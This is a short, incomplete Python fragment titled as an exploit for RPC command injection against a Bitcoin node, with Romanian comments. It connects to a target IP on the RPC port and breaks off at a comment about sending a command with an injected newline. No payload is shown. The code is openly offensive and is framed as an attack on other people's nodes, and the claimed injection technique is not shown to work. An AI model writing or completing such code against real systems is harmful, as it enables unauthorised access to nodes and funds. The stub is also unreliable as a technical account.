# bitcoin_rpc_exploit.py
# Exploit: RPC command injection (dacă e activat RPC)
from bitcoin.rpc import RawProxy
import json

def rpc_command_injection(target_ip, rpc_port=8332):
    p = RawProxy(service_url=f"http://{target_ip}:{rpc_port}")
    # Trimite comanda cu newline injectat